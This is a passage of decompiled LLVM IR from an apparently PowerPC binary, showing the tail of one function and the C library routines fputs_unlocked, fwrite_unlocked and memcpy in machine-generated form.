  %v1_1000dac0 = load i32, i32* @r28, align 4
  %v2_1000dac0 = add i32 %v1_1000dac0, %v1_1000dab8
  store i32 %v2_1000dac0, i32* %r9.global-to-local, align 4
  %v1_1000dac4 = add i32 %v2_1000dac0, 40
  %v2_1000dac4 = inttoptr i32 %v1_1000dac4 to i32*
  %v3_1000dac4 = load i32, i32* %v2_1000dac4, align 4
  store i32 %v3_1000dac4, i32* %r3.global-to-local, align 4
  br i1 %v3_1000dabc, label %dec_label_pc_1000db1c, label %dec_label_pc_1000dacc

dec_label_pc_1000dacc:                            ; preds = %dec_label_pc_1000daa8
  %v3_1000dacc = icmp eq i32 %v3_1000dac4, 8
  br i1 %v3_1000dacc, label %dec_label_pc_1000db04, label %dec_label_pc_1000dad4

dec_label_pc_1000dad4:                            ; preds = %dec_label_pc_1000dacc
  %v4_1000dad4 = icmp eq i32 %v3_1000dac4, %v4_1000dab0
  br i1 %v4_1000dad4, label %dec_label_pc_1000db04, label %dec_label_pc_1000dadc

dec_label_pc_1000dadc:                            ; preds = %dec_label_pc_1000dad4
  %v1_1000dadc = call i32 @_promoted_size(i32 %v3_1000dac4)
  store i32 %v1_1000dadc, i32* @r29, align 4
  %v0_1000dae4 = load i32, i32* @r31, align 4
  store i32 %v0_1000dae4, i32* %r3.global-to-local, align 4
  %v1_1000dae8 = call i32 @_promoted_size(i32 %v0_1000dae4)
  store i32 %v1_1000dae8, i32* %r3.global-to-local, align 4
  %v0_1000daf4 = call i32 @__asm_mfcr()
  store i32 %v0_1000daf4, i32* %r3.global-to-local, align 4
  store i32 %v0_1000daf4, i32* %r0.global-to-local, align 4
  %v1_1000daf8 = call i32 @__asm_rlwinm(i32 %v0_1000daf4, i32 31, i32 31, i32 31)
  store i32 %v1_1000daf8, i32* %r0.global-to-local, align 4
  %v3_1000dafc = icmp eq i32 %v1_1000daf8, 0
  br i1 %v3_1000dafc, label %dec_label_pc_1000db1c, label %dec_label_pc_1000dadc.dec_label_pc_1000db04_crit_edge

dec_label_pc_1000dadc.dec_label_pc_1000db04_crit_edge: ; preds = %dec_label_pc_1000dadc
  %v0_1000db08.pre = load i32, i32* @r27, align 4
  %v0_1000db10.pre = load i32, i32* @r25, align 4
  %v1_1000db14.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000db04

dec_label_pc_1000db04:                            ; preds = %dec_label_pc_1000dadc.dec_label_pc_1000db04_crit_edge, %dec_label_pc_1000dad4, %dec_label_pc_1000dacc
  %v1_1000db14 = phi i32 [ %v1_1000db14.pre, %dec_label_pc_1000dadc.dec_label_pc_1000db04_crit_edge ], [ %v1_1000dac0, %dec_label_pc_1000dad4 ], [ %v1_1000dac0, %dec_label_pc_1000dacc ]
  %v0_1000db10 = phi i32 [ %v0_1000db10.pre, %dec_label_pc_1000dadc.dec_label_pc_1000db04_crit_edge ], [ %v1_1000dab4, %dec_label_pc_1000dad4 ], [ %v1_1000dab4, %dec_label_pc_1000dacc ]
  %v0_1000db08 = phi i32 [ %v0_1000db08.pre, %dec_label_pc_1000dadc.dec_label_pc_1000db04_crit_edge ], [ %v0_1000daac, %dec_label_pc_1000dad4 ], [ %v0_1000daac, %dec_label_pc_1000dacc ]
  store i32 %v2_1000d744.pre-phi, i32* %r9.global-to-local, align 4
  %v1_1000db08 = mul i32 %v0_1000db08, 4
  store i32 %v1_1000db08, i32* %r0.global-to-local, align 4
  %v2_1000db0c = add i32 %v1_1000db08, %v2_1000d744.pre-phi
  %v3_1000db0c = inttoptr i32 %v2_1000db0c to i32*
  %v4_1000db0c = load i32, i32* %v3_1000db0c, align 4
  store i32 %v4_1000db0c, i32* %r0.global-to-local, align 4
  %v1_1000db10 = mul i32 %v0_1000db10, 4
  %v2_1000db14 = add i32 %v1_1000db10, %v1_1000db14
  store i32 %v2_1000db14, i32* %r9.global-to-local, align 4
  %v2_1000db18 = add i32 %v2_1000db14, 40
  %v3_1000db18 = inttoptr i32 %v2_1000db18 to i32*
  store i32 %v4_1000db0c, i32* %v3_1000db18, align 4
  br label %dec_label_pc_1000db1c

dec_label_pc_1000db1c:                            ; preds = %dec_label_pc_1000dadc, %dec_label_pc_1000daa8, %dec_label_pc_1000db04
  %v0_1000db1c = load i32, i32* @r28, align 4
  %v1_1000db1c = add i32 %v0_1000db1c, 28
  %v2_1000db1c = inttoptr i32 %v1_1000db1c to i32*
  %v3_1000db1c = load i32, i32* %v2_1000db1c, align 4
  %v0_1000db20 = load i32, i32* @r27, align 4
  %v1_1000db20 = add i32 %v0_1000db20, 1
  store i32 %v1_1000db20, i32* @r27, align 4
  %v1_1000db24 = add i32 %v3_1000db1c, 2
  store i32 %v1_1000db24, i32* %r9.global-to-local, align 4
  %v2_1000db28 = icmp slt i32 %v1_1000db20, %v1_1000db24
  br i1 %v2_1000db28, label %dec_label_pc_1000da64, label %dec_label_pc_1000db4c

dec_label_pc_1000db34:                            ; preds = %dec_label_pc_1000da58
  %v0_1000db34 = load i32, i32* @r28, align 4
  %v1_1000db34 = add i32 %v0_1000db34, 28
  %v2_1000db34 = inttoptr i32 %v1_1000db34 to i32*
  %v3_1000db34 = load i32, i32* %v2_1000db34, align 4
  store i32 %v3_1000db34, i32* %r5.global-to-local, align 4
  %v1_1000db38 = add i32 %v0_1000db34, 40
  store i32 %v1_1000db38, i32* @r3, align 4
  %v0_1000db3c = load i32, i32* @r7, align 4
  %v1_1000db3c = trunc i32 %v0_1000db3c to i8
  %v3_1000db3c = add i32 %v0_1000db34, 38
  %v4_1000db3c = inttoptr i32 %v3_1000db3c to i8*
  store i8 %v1_1000db3c, i8* %v4_1000db3c, align 1
  %v2_1000db40 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1000db40, i32* @r4, align 4
  %v0_1000db44 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000db44 = mul i32 %v0_1000db44, 4
  store i32 %v1_1000db44, i32* @r5, align 4
  store i32 268491596, i32* @lr, align 4
  %v0_1000db48 = call i32 @memcpy()
  store i32 %v0_1000db48, i32* %r3.global-to-local, align 4
  %v0_1000db4c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000db4c

dec_label_pc_1000db4c:                            ; preds = %dec_label_pc_1000db1c, %dec_label_pc_1000db34
  %v0_1000db4c = phi i32 [ %v0_1000db4c.pre, %dec_label_pc_1000db34 ], [ %v0_1000db1c, %dec_label_pc_1000db1c ]
  %v1_1000db4c = add i32 %v0_1000db4c, 16
  %v2_1000db4c = inttoptr i32 %v1_1000db4c to i32*
  %v3_1000db4c = load i32, i32* %v2_1000db4c, align 4
  store i32 %v3_1000db4c, i32* %r0.global-to-local, align 4
  %v0_1000db50 = load i32, i32* @r26, align 4
  %v2_1000db50 = add i32 %v0_1000db4c, 24
  %v3_1000db50 = inttoptr i32 %v2_1000db50 to i32*
  store i32 %v0_1000db50, i32* %v3_1000db50, align 4
  %v0_1000db54 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000db54 = and i32 %v0_1000db54, 128
  store i32 %v1_1000db54, i32* %r9.global-to-local, align 4
  %v3_1000db54 = icmp eq i32 %v1_1000db54, 0
  br i1 %v3_1000db54, label %dec_label_pc_1000db5c, label %dec_label_pc_1000db68

dec_label_pc_1000db5c:                            ; preds = %dec_label_pc_1000db4c
  %v0_1000db5c = load i32, i32* @r30, align 4
  %v1_1000db5c = add i32 %v0_1000db5c, 1
  store i32 %v1_1000db5c, i32* %r0.global-to-local, align 4
  %v1_1000db60 = load i32, i32* @r28, align 4
  %v2_1000db60 = inttoptr i32 %v1_1000db60 to i32*
  store i32 %v1_1000db5c, i32* %v2_1000db60, align 4
  br label %dec_label_pc_1000db80

dec_label_pc_1000db68:                            ; preds = %dec_label_pc_1000db4c
  %v2_1000db68 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_1000db68, i32* %r0.global-to-local, align 4
  %v0_1000db6c = load i32, i32* @r28, align 4
  %v1_1000db6c = inttoptr i32 %v0_1000db6c to i32*
  %v2_1000db6c = load i32, i32* %v1_1000db6c, align 4
  %v1_1000db70 = load i32, i32* @r30, align 4
  %v2_1000db70 = sub i32 %v1_1000db70, %v2_1000db68
  %v1_1000db74 = mul i32 %v2_1000db70, 4
  store i32 %v1_1000db74, i32* %r0.global-to-local, align 4
  %v2_1000db78 = add i32 %v1_1000db74, %v2_1000db6c
  store i32 %v2_1000db78, i32* %r9.global-to-local, align 4
  store i32 %v2_1000db78, i32* %v1_1000db6c, align 4
  br label %dec_label_pc_1000db80

dec_label_pc_1000db80:                            ; preds = %dec_label_pc_1000db5c, %dec_label_pc_1000db68
  %v0_1000db80 = load i32, i32* @r28, align 4
  %v1_1000db80 = add i32 %v0_1000db80, 28
  %v2_1000db80 = inttoptr i32 %v1_1000db80 to i32*
  %v3_1000db80 = load i32, i32* %v2_1000db80, align 4
  store i32 %v3_1000db80, i32* %r9.global-to-local, align 4
  %v1_1000db84 = add i32 %v3_1000db80, 2
  br label %dec_label_pc_1000db90

dec_label_pc_1000db90:                            ; preds = %dec_label_pc_1000d6f4, %dec_label_pc_1000d7c8, %dec_label_pc_1000d8a4, %dec_label_pc_1000d898, %dec_label_pc_1000d8c0, %dec_label_pc_1000d7fc, %dec_label_pc_1000da9c, %dec_label_pc_1000d94c, %dec_label_pc_1000da40, %dec_label_pc_1000db80
  %storemerge2 = phi i32 [ %v1_1000db84, %dec_label_pc_1000db80 ], [ -1, %dec_label_pc_1000da40 ], [ -1, %dec_label_pc_1000d94c ], [ -1, %dec_label_pc_1000da9c ], [ -1, %dec_label_pc_1000d7fc ], [ -1, %dec_label_pc_1000d8c0 ], [ -1, %dec_label_pc_1000d898 ], [ -1, %dec_label_pc_1000d8a4 ], [ -1, %dec_label_pc_1000d7c8 ], [ -1, %dec_label_pc_1000d6f4 ]
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %v0_1000d68c, i32* %r0.global-to-local, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_1000db74, { 1, 0 }
  uselistorder i32 %v0_1000db4c, { 1, 0 }
  uselistorder i32 %v1_1000db20, { 1, 2, 0 }
  uselistorder i32 %v1_1000db08, { 1, 0 }
  uselistorder i32 %v0_1000daf4, { 0, 2, 1 }
  uselistorder i32 %v3_1000dac4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000dac0, { 1, 2, 0 }
  uselistorder i32 %v1_1000dab4, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000daac, { 1, 0 }
  uselistorder i32 %v0_1000daac, { 1, 2, 0 }
  uselistorder i32 %v3_1000da74, { 1, 0, 2 }
  uselistorder i32 %v1_1000da6c, { 1, 0 }
  uselistorder i32 %v0_1000da8c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000d9e4, { 1, 2, 0 }
  uselistorder i32 %v1_1000d9bc, { 2, 1, 0 }
  uselistorder i32 %v1_1000d9a8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000d98c, { 1, 0, 2 }
  uselistorder i32 %v1_1000d958, { 1, 3, 2, 0 }
  uselistorder i32 %v1_1000d914, { 0, 2, 3, 1 }
  uselistorder i32 %v0_1000d8d8, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1000d8c4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_1000d834, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1000d830, { 1, 0 }
  uselistorder i32 %v0_1000d848, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %stack_var_-84.2, { 1, 0 }
  uselistorder i32 %v0_1000d7ac, { 0, 1, 6, 4, 3, 5, 2, 7 }
  uselistorder i32 %v2_1000d7a4, { 1, 0 }
  uselistorder i32 %v1_1000d794, { 1, 0 }
  uselistorder i32 %v3_1000d78c, { 1, 0, 2 }
  uselistorder i32 %v0_1000d808, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_1000d7d8, { 0, 1, 3, 2, 4, 5, 6, 7, 9, 8 }
  uselistorder i32 %v0_1000d768, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1000d750, { 1, 0 }
  uselistorder i32 %v2_1000d744.pre-phi, { 0, 4, 1, 3, 2 }
  uselistorder i32 %v1_1000d724, { 1, 0 }
  uselistorder i32 %v1_1000d70c, { 1, 2, 0 }
  uselistorder i32 %v0_1000d700, { 2, 1, 0 }
  uselistorder i32* %stack_var_-104, { 2, 0, 1 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 0, 4, 1, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 0, 4, 5, 6, 7, 8, 9, 1 }
  uselistorder i32* %r10.global-to-local, { 1, 2, 3, 4, 7, 8, 9, 5, 6, 0, 10, 11, 12 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_100194a8.726 to i32), { 3, 0, 1, 2 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_10019468.725 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 0, 3, 4, 2, 5, 1, 6, 7 }
  uselistorder i32* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000db90, { 9, 6, 8, 7, 4, 2, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_1000db80, { 1, 0 }
  uselistorder label %dec_label_pc_1000db4c, { 1, 0 }
  uselistorder label %dec_label_pc_1000db1c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000daa8, { 1, 0 }
  uselistorder label %dec_label_pc_1000da94, { 1, 0 }
  uselistorder label %dec_label_pc_1000da58, { 1, 0 }
  uselistorder label %dec_label_pc_1000d9a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d94c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d8fc, { 1, 0 }
  uselistorder label %dec_label_pc_1000d8d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000d884, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d880, { 1, 0 }
  uselistorder label %dec_label_pc_1000d7f4, { 1, 0 }
  uselistorder label %dec_label_pc_1000d7ec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d78c, { 1, 0 }
  uselistorder label %dec_label_pc_1000d788, { 1, 0 }
  uselistorder label %dec_label_pc_1000d774, { 1, 0 }
  uselistorder label %dec_label_pc_1000d754, { 1, 0 }
  uselistorder label %dec_label_pc_1000d750, { 1, 0 }
  uselistorder label %dec_label_pc_1000d734, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_1000dbbc = call i32 @__GI_strlen()
  store i32 %v0_1000dbbc, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_1000dbd8.731 to i32), i32* @lr, align 4
  %v4_1000dbd4 = inttoptr i32 %arg2 to i16*
  %v5_1000dbd4 = call i32 @__GI_fwrite_unlocked(i32 %arg1, i32 1, i32 %v0_1000dbbc, i16* %v4_1000dbd4)
  %v1_1000dbdc = load i32, i32* @r27, align 4
  %v4_1000dbdc = icmp eq i32 %v5_1000dbd4, %v1_1000dbdc
  br i1 %v4_1000dbdc, label %dec_label_pc_1000dbe4, label %dec_label_pc_1000dbe8

dec_label_pc_1000dbe4:                            ; preds = %entry
  br label %dec_label_pc_1000dbe8

dec_label_pc_1000dbe8:                            ; preds = %entry, %dec_label_pc_1000dbe4
  %v0_1000dbe8 = phi i32 [ -1, %entry ], [ %v5_1000dbd4, %dec_label_pc_1000dbe4 ]
  ret i32 %v0_1000dbe8

; uselistorder directives
  uselistorder label %dec_label_pc_1000dbe8, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* @r28, align 4
  %v3_1000dc18 = load i16, i16* %arg4, align 2
  %v4_1000dc18 = zext i16 %v3_1000dc18 to i32
  store i32 %tmp, i32* @r31, align 4
  store i32 128, i32* @r4, align 4
  store i32 %arg3, i32* @r30, align 4
  %v1_1000dc28 = call i32 @__asm_rlwinm(i32 %v4_1000dc18, i32 0, i32 24, i32 25)
  store i32 %tmp, i32* @r3, align 4
  %v3_1000dc30 = icmp eq i32 %v1_1000dc28, 192
  br i1 %v3_1000dc30, label %dec_label_pc_1000dc44, label %dec_label_pc_1000dc38

dec_label_pc_1000dc38:                            ; preds = %entry
  store i32 268491836, i32* @lr, align 4
  %v0_1000dc38 = call i32 @__stdio_trans2w_o()
  %v3_1000dc3c = icmp eq i32 %v0_1000dc38, 0
  br i1 %v3_1000dc3c, label %dec_label_pc_1000dc44, label %dec_label_pc_1000dc9c

dec_label_pc_1000dc44:                            ; preds = %dec_label_pc_1000dc38, %entry
  %v0_1000dc44 = load i32, i32* @r29, align 4
  %v3_1000dc44 = icmp eq i32 %v0_1000dc44, 0
  %v0_1000dc48 = load i32, i32* @r30, align 4
  %v3_1000dc48 = icmp eq i32 %v0_1000dc48, 0
  %brmerge = or i1 %v3_1000dc44, %v3_1000dc48
  br i1 %brmerge, label %dec_label_pc_1000dc9c, label %dec_label_pc_1000dc54

dec_label_pc_1000dc54:                            ; preds = %dec_label_pc_1000dc44
  %v2_1000dc5c = udiv i32 -1, %v0_1000dc44
  %v0_1000dc60 = load i32, i32* @r31, align 4
  %v3_1000dc64 = icmp ugt i32 %v0_1000dc48, %v2_1000dc5c
  %v1_1000dc7c = inttoptr i32 %v0_1000dc60 to i16*
  br i1 %v3_1000dc64, label %dec_label_pc_1000dc7c, label %dec_label_pc_1000dc6c

dec_label_pc_1000dc6c:                            ; preds = %dec_label_pc_1000dc54
  %v0_1000dc58 = load i32, i32* @r28, align 4
  %v2_1000dc6c = mul i32 %v0_1000dc48, %v0_1000dc44
  store i32 %v2_1000dc6c, i32* %r4.global-to-local, align 4
  store i32 268491892, i32* @lr, align 4
  %v5_1000dc70 = call i32 @__stdio_fwrite(i32 %v0_1000dc58, i32 %v2_1000dc6c, i16* %v1_1000dc7c)
  %v1_1000dc74 = load i32, i32* @r29, align 4
  %v2_1000dc74 = udiv i32 %v5_1000dc70, %v1_1000dc74
  store i32 %v2_1000dc74, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000dca0

dec_label_pc_1000dc7c:                            ; preds = %dec_label_pc_1000dc54
  %v2_1000dc7c = load i16, i16* %v1_1000dc7c, align 2
  %v1_1000dc80 = or i16 %v2_1000dc7c, 8
  store i16 %v1_1000dc80, i16* %v1_1000dc7c, align 2
  %v0_1000dc88 = call i32 @__errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1000dc94 = inttoptr i32 %v0_1000dc88 to i32*
  store i32 22, i32* %v2_1000dc94, align 4
  %v0_1000dca4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000dca0

dec_label_pc_1000dc9c:                            ; preds = %dec_label_pc_1000dc44, %dec_label_pc_1000dc38
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000dca0

dec_label_pc_1000dca0:                            ; preds = %dec_label_pc_1000dc7c, %dec_label_pc_1000dc6c, %dec_label_pc_1000dc9c
  %v0_1000dca4 = phi i32 [ %v0_1000dca4.pre, %dec_label_pc_1000dc7c ], [ %v2_1000dc74, %dec_label_pc_1000dc6c ], [ 0, %dec_label_pc_1000dc9c ]
  ret i32 %v0_1000dca4

; uselistorder directives
  uselistorder i16* %v1_1000dc7c, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 1, 2, 3, 5, 6, 0, 4 }
  uselistorder label %dec_label_pc_1000dca0, { 2, 0, 1 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1000dcb8 = load i32, i32* @r5, align 4
  %v1_1000dcb8 = call i32 @__asm_rlwinm.(i32 %v0_1000dcb8, i32 29, i32 3, i32 31)
  store i32 %v1_1000dcb8, i32* %r9.global-to-local, align 4
  %v4_1000dcb8 = icmp eq i32 %v1_1000dcb8, 0
  store i1 false, i1* @cr0_so, align 1
  %v0_1000dcbc = load i32, i32* @r4, align 4
  %v1_1000dcbc = add i32 %v0_1000dcbc, -4
  store i32 %v1_1000dcbc, i32* %r4.global-to-local, align 4
  %v0_1000dcc0 = load i32, i32* @r3, align 4
  %v1_1000dcc0 = add i32 %v0_1000dcc0, -4
  store i32 %v1_1000dcc0, i32* @r11, align 4
  br i1 %v4_1000dcb8, label %dec_label_pc_1000dce8, label %dec_label_pc_1000dcc8

dec_label_pc_1000dcc8:                            ; preds = %entry
  %v1_1000dcc8 = urem i32 %v1_1000dcc0, 4
  %v3_1000dcc8 = icmp eq i32 %v1_1000dcc8, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_1000dcc8, label %dec_label_pc_1000dcd0, label %dec_label_pc_1000dd24

dec_label_pc_1000dcd0:                            ; preds = %dec_label_pc_1000dd44.dec_label_pc_1000dcd0_crit_edge, %dec_label_pc_1000dcc8
  %v1_1000dcdc.pre = phi i32 [ %v1_1000dcc0, %dec_label_pc_1000dcc8 ], [ %v1_1000dcdc.pre.pre, %dec_label_pc_1000dd44.dec_label_pc_1000dcd0_crit_edge ]
  %v0_1000dcd0 = phi i32 [ %v1_1000dcb8, %dec_label_pc_1000dcc8 ], [ %v1_1000dd44, %dec_label_pc_1000dd44.dec_label_pc_1000dcd0_crit_edge ]
  %.0 = phi i32 [ undef, %dec_label_pc_1000dcc8 ], [ %v2_1000dd2c, %dec_label_pc_1000dd44.dec_label_pc_1000dcd0_crit_edge ]
  store i32 %v0_1000dcd0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000dcd4

dec_label_pc_1000dcd4:                            ; preds = %dec_label_pc_1000dcd4, %dec_label_pc_1000dcd0
  %v1_1000dcdc = phi i32 [ %v2_1000dce0, %dec_label_pc_1000dcd4 ], [ %v1_1000dcdc.pre, %dec_label_pc_1000dcd0 ]
  %v0_1000dcd4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000dcd4 = add i32 %v0_1000dcd4, 4
  %v2_1000dcd4 = inttoptr i32 %v1_1000dcd4 to i32*
  %v3_1000dcd4 = load i32, i32* %v2_1000dcd4, align 4
  %v1_1000dcd8 = add i32 %v0_1000dcd4, 8
  %v2_1000dcd8 = inttoptr i32 %v1_1000dcd8 to i32*
  %v3_1000dcd8 = load i32, i32* %v2_1000dcd8, align 4
  store i32 %v3_1000dcd8, i32* %r9.global-to-local, align 4
  store i32 %v1_1000dcd8, i32* %r4.global-to-local, align 4
  %v2_1000dcdc = add i32 %v1_1000dcdc, 4
  %v3_1000dcdc = inttoptr i32 %v2_1000dcdc to i32*
  store i32 %v3_1000dcd4, i32* %v3_1000dcdc, align 4
  %v0_1000dce0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000dce0 = load i32, i32* @r11, align 4
  %v2_1000dce0 = add i32 %v1_1000dce0, 8
  %v3_1000dce0 = inttoptr i32 %v2_1000dce0 to i32*
  store i32 %v0_1000dce0, i32* %v3_1000dce0, align 4
  store i32 %v2_1000dce0, i32* @r11, align 4
  %v0_1000dce4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000dce4 = add i32 %v0_1000dce4, -1
  store i32 %v1_1000dce4, i32* %ctr.global-to-local, align 4
  %v2_1000dce4 = icmp eq i32 %v1_1000dce4, 0
  br i1 %v2_1000dce4, label %dec_label_pc_1000dce8, label %dec_label_pc_1000dcd4

dec_label_pc_1000dce8:                            ; preds = %dec_label_pc_1000dcd4, %dec_label_pc_1000dd44, %entry
  %.1 = phi i32 [ undef, %entry ], [ %v2_1000dd2c, %dec_label_pc_1000dd44 ], [ %.0, %dec_label_pc_1000dcd4 ]
  %v1_1000dce8 = urem i32 %.1, 8
  store i32 %v1_1000dce8, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_1000dce8, 4
  br i1 %tmp, label %dec_label_pc_1000dd00, label %dec_label_pc_1000dcf4

dec_label_pc_1000dcf4:                            ; preds = %dec_label_pc_1000dce8
  %v0_1000dcf4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000dcf4 = add i32 %v0_1000dcf4, 4
  %v2_1000dcf4 = inttoptr i32 %v1_1000dcf4 to i32*
  %v3_1000dcf4 = load i32, i32* %v2_1000dcf4, align 4
  store i32 %v1_1000dcf4, i32* %r4.global-to-local, align 4
  %v1_1000dcf8 = add nsw i32 %v1_1000dce8, -4
  store i32 %v1_1000dcf8, i32* @r5, align 4
  %v1_1000dcfc = load i32, i32* @r11, align 4
  %v2_1000dcfc = add i32 %v1_1000dcfc, 4
  %v3_1000dcfc = inttoptr i32 %v2_1000dcfc to i32*
  store i32 %v3_1000dcf4, i32* %v3_1000dcfc, align 4
  store i32 %v2_1000dcfc, i32* @r11, align 4
  %v0_1000dd00.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000dd00

dec_label_pc_1000dd00:                            ; preds = %dec_label_pc_1000dce8, %dec_label_pc_1000dcf4
  %v0_1000dd00 = phi i32 [ %v1_1000dce8, %dec_label_pc_1000dce8 ], [ %v0_1000dd00.pre, %dec_label_pc_1000dcf4 ]
  %v3_1000dd00 = icmp eq i32 %v0_1000dd00, 0
  %v0_1000dd04 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000dd00, i32 %v0_1000dd04)
  %v0_1000dd08 = load i32, i32* @r5, align 4
  store i32 %v0_1000dd08, i32* %ctr.global-to-local, align 4
  %v0_1000dd0c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000dd0c = add i32 %v0_1000dd0c, 3
  store i32 %v1_1000dd0c, i32* %r4.global-to-local, align 4
  %v0_1000dd10 = load i32, i32* @r11, align 4
  %v1_1000dd10 = add i32 %v0_1000dd10, 3
  store i32 %v1_1000dd10, i32* %r9.global-to-local, align 4
  %v1_1000dd149 = add i32 %v0_1000dd0c, 4
  %v2_1000dd1410 = inttoptr i32 %v1_1000dd149 to i8*
  %v3_1000dd1411 = load i8, i8* %v2_1000dd1410, align 1
  store i32 %v1_1000dd149, i32* %r4.global-to-local, align 4
  %v3_1000dd1813 = add i32 %v0_1000dd10, 4
  %v4_1000dd1814 = inttoptr i32 %v3_1000dd1813 to i8*
  store i8 %v3_1000dd1411, i8* %v4_1000dd1814, align 1
  store i32 %v3_1000dd1813, i32* %r9.global-to-local, align 4
  %v0_1000dd1c15 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000dd1c16 = add i32 %v0_1000dd1c15, -1
  store i32 %v1_1000dd1c16, i32* %ctr.global-to-local, align 4
  %v2_1000dd1c17 = icmp eq i32 %v1_1000dd1c16, 0
  br i1 %v2_1000dd1c17, label %dec_label_pc_1000dd50, label %dec_label_pc_1000dd14.dec_label_pc_1000dd14_crit_edge

dec_label_pc_1000dd14.dec_label_pc_1000dd14_crit_edge: ; preds = %dec_label_pc_1000dd00, %dec_label_pc_1000dd14.dec_label_pc_1000dd14_crit_edge
  %v3_1000dd1818 = phi i32 [ %v3_1000dd18, %dec_label_pc_1000dd14.dec_label_pc_1000dd14_crit_edge ], [ %v3_1000dd1813, %dec_label_pc_1000dd00 ]
  %v0_1000dd14.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1000dd14 = add i32 %v0_1000dd14.pre, 1
  %v2_1000dd14 = inttoptr i32 %v1_1000dd14 to i8*
  %v3_1000dd14 = load i8, i8* %v2_1000dd14, align 1
  store i32 %v1_1000dd14, i32* %r4.global-to-local, align 4
  %v3_1000dd18 = add i32 %v3_1000dd1818, 1
  %v4_1000dd18 = inttoptr i32 %v3_1000dd18 to i8*
  store i8 %v3_1000dd14, i8* %v4_1000dd18, align 1
  store i32 %v3_1000dd18, i32* %r9.global-to-local, align 4
  %v0_1000dd1c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000dd1c = add i32 %v0_1000dd1c, -1
  store i32 %v1_1000dd1c, i32* %ctr.global-to-local, align 4
  %v2_1000dd1c = icmp eq i32 %v1_1000dd1c, 0
  br i1 %v2_1000dd1c, label %dec_label_pc_1000dd50, label %dec_label_pc_1000dd14.dec_label_pc_1000dd14_crit_edge

dec_label_pc_1000dd24:                            ; preds = %dec_label_pc_1000dcc8
  %v1_1000dd24 = sub nsw i32 4, %v1_1000dcc8
  store i32 %v1_1000dd24, i32* %ctr.global-to-local, align 4
  %v1_1000dd2c = load i32, i32* @r5, align 4
  %v2_1000dd2c = sub i32 %v1_1000dd2c, %v1_1000dd24
  br label %dec_label_pc_1000dd30

